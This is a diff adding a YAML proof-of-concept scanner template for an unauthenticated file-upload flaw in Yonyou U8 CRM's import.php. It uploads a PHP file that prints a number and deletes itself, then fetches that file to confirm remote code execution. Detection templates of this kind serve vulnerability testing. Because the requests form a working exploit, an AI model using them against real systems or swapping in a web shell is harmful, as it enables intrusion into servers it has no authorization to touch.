@@ -1,0 +1,49 @@
+name: poc-yaml-yongyouU8-CRM-import-files-upload
+transport: http
+
+set:
+  rboundary: randomLowercase(8)
+  randstr: randomLowercase(6)
+  
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBound{{rboundary}}
+      body: "\
+        ------WebKitFormBound{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"xfile\"; filename=\"1.xls\"\r\n\
+        \r\n\
+       <?php print(111*222);unlink(__FILE__);?>\r\n\
+       ------WebKitFormBound{{rboundary}}\r\n\
+       Content-Disposition: form-data; name=\"combo\"\r\n\
+       \r\n\
+       {{randstr}}.php\r\n\
+       ------WebKitFormBound{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+
+
+  r1:
+    request:
+      method: GET
+      path: /tmpfile/{{randstr}}.php
+    expression: response.status == 200 && response.body.bcontains(b'24642')
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140657464
+
+
+
+
+
+
+
+
